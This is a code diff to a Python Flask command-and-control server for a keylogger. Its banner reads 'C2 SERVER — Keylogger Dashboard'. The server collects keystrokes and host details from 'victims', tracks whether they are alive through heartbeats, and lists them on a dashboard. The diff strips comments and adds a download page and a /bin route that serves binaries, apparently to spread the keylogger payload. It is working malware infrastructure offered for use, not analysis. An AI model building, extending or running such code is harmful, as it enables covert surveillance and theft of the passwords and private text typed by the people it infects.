@@ -1,13 +1,15 @@
-from flask import Flask, request
+from flask import Flask, request, send_from_directory, render_template_string, render_template
 import os
 import datetime
 import sys
 import socket
 
-app = Flask(__name__)
+app = Flask(__name__, template_folder='.')
 
 LOG_DIR = "logs"
+BIN_DIR = "bin"  # <-- You need this directory too, or remove the /bin route
 os.makedirs(LOG_DIR, exist_ok=True)
+os.makedirs(BIN_DIR, exist_ok=True)  # Create bin dir if it doesn't exist
 
 victims = {}
 HEARTBEAT_TIMEOUT = 40
@@ -47,16 +49,14 @@ class Log:
         cprint(f"    Hostname : {name}", color=C.CYAN)
         cprint(f"    HWID     : {hwid}", color=C.CYAN)
         cprint(f"    IP       : {ip}", color=C.CYAN)
-        print()  # blank line for spacing
+        print()
 
     @staticmethod
     def keystroke(name, hwid, count, preview=""):
-        """Dim/grey for routine keystroke data — low importance noise."""
+        """Dim/grey for routine keystroke data."""
         ts = datetime.datetime.now().strftime("%H:%M:%S")
-
         if preview:
             preview_clean = preview.replace('\n', '\\n')[:80]
-
             print(
                 f"{C.DIM}[{ts}] "
                 f"{C.CYAN}Keylog:{C.RESET} "
@@ -74,13 +74,13 @@ class Log:
 
     @staticmethod
     def heartbeat(name, hwid):
-        """Very dim — pings clutter the screen, make them barely visible."""
+        """Very dim — pings clutter the screen."""
         ts = datetime.datetime.now().strftime("%H:%M:%S")
         print(
-        f"{C.DIM}[{ts}] "
-        f"{C.YELLOW}Alive ♥{C.RESET}"
-        f"{C.DIM} {name} ({hwid[:8]}...){C.RESET}"
-    )
+            f"{C.DIM}[{ts}] "
+            f"{C.YELLOW}Alive ♥{C.RESET}"
+            f"{C.DIM} {name} ({hwid[:8]}...){C.RESET}"
+        )
 
     @staticmethod
     def status_change(name, hwid, alive):
@@ -94,57 +94,40 @@ class Log:
     @staticmethod
     def server_start():
         """Banner on startup."""
-
         def get_local_ip():
-            """
-            Get the LAN IP address of this machine.
-            Works even when bound to 0.0.0.0
-            """
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             try:
-                # Doesn't actually send packets
                 s.connect(("8.8.8.8", 80))
                 ip = s.getsockname()[0]
             except Exception:
                 ip = "127.0.0.1"
             finally:
                 s.close()
-
             return ip
 
         local_ip = get_local_ip()
-
         print()
         cprint("╔══════════════════════════════════════════════╗", color=C.MAGENTA, bold=True)
         cprint("║         C2 SERVER — Keylogger Dashboard      ║", color=C.MAGENTA, bold=True)
         cprint("╚══════════════════════════════════════════════╝", color=C.MAGENTA, bold=True)
         print()
-
         cprint(f"  Log directory : {os.path.abspath(LOG_DIR)}", color=C.BLUE)
-
-        # Clickable localhost URL
         cprint(f"  Local access  : https://127.0.0.1:8443", color=C.BLUE)
-
-        # Real LAN IP
         cprint(f"  System IP     : {local_ip}", color=C.BLUE)
-
-        # Clickable dashboard URL
         cprint(f"  Dashboard     : https://{local_ip}:8443/clients", color=C.BLUE)
-
         print()
 
     @staticmethod
     def request(method, path, status_code):
-        """Dim HTTP request log — suppress noise from Flask's default logger."""
+        """Dim HTTP request log."""
         ts = datetime.datetime.now().strftime("%H:%M:%S")
         code_color = C.GREEN if status_code < 400 else C.RED
         print(f"{C.DIM}[{ts}] {method} {path} → {C.RESET}{code_color}{status_code}{C.RESET}")
 
-
 # --- Suppress Flask's default boring request logs ---
 import logging
 log = logging.getLogger('werkzeug')
-log.setLevel(logging.ERROR)  # Only show ERROR level from Flask/Werkzeug
+log.setLevel(logging.ERROR)
 
 @app.route("/log", methods=["POST"])
 def receive_log():
@@ -184,27 +167,19 @@ def receive_log():
         with open(client_log, "w") as f:
             f.write("\n".join(header_lines))
 
-        # Console: new victim notification (only once)
         if is_new_client:
             Log.new_victim(hostname, hwid, client_ip)
 
-    # --- Append keystrokes to per-client log ---
     with open(client_log, "a") as f:
         f.write(f"[{now}] {keystrokes}\n")
 
-    # --- Unified log ---
     with open(os.path.join(LOG_DIR, "all_clients.log"), "a") as f:
         f.write(f"[{now}] [{hostname}] [{hwid}] ({client_ip}) {keystrokes}\n")
 
-    # --- Console: keystroke log ---
     if keystrokes:
-        preview = keystrokes[:120]  # show first 120 chars
+        preview = keystrokes[:120]
         Log.keystroke(hostname, hwid, len(keystrokes), preview)
-    elif is_first_contact:
-        # First contact with no keystrokes yet (just system info)
-        pass  # new_victim was already printed above
 
-    # --- In-memory victim tracking ---
     was_alive = False
     if hwid not in victims:
         victims[hwid] = {
@@ -226,12 +201,10 @@ def receive_log():
     victims[hwid]["ip"] = client_ip
     victims[hwid]["alive"] = True
 
-    # Detect recovery from dead → alive
     if not was_alive:
         Log.status_change(hostname, hwid, alive=True)
 
     return "OK", 200
-
 
 @app.route("/ping", methods=["POST"])
 def heartbeat():
@@ -261,14 +234,12 @@ def heartbeat():
         victims[hwid]["ip"] = client_ip
         victims[hwid]["alive"] = True
 
-        # Print heartbeat (dim) unless status changed
         if not was_alive:
             Log.status_change(hostname, hwid, alive=True)
         else:
             Log.heartbeat(hostname, hwid)
 
     return "PONG", 200
-
 
 def is_victim_alive(last_seen_ts):
     return (datetime.datetime.now().timestamp() - last_seen_ts) < HEARTBEAT_TIMEOUT
@@ -280,7 +251,6 @@ def list_clients():
         prev_alive = info.get("alive", True)
         info["alive"] = currently_alive
 
-        # Detect alive → dead transition
         if prev_alive and not currently_alive:
             Log.status_change(info["hostname"], hwid, alive=False)
 
@@ -366,6 +336,13 @@ def view_log(filename):
         content = f.read()
     return f"<pre style='font-size: 0.9rem;'>{content}</pre>", 200, {"Content-Type": "text/html; charset=utf-8"}
 
+@app.route("/download", methods=["GET"])
+def download_page():
+    return render_template("download.html")
+
+@app.route("/bin/<path:filename>", methods=["GET"])
+def serve_bin(filename):
+    return send_from_directory(BIN_DIR, filename, as_attachment=True)
 
 if __name__ == "__main__":
     Log.server_start()
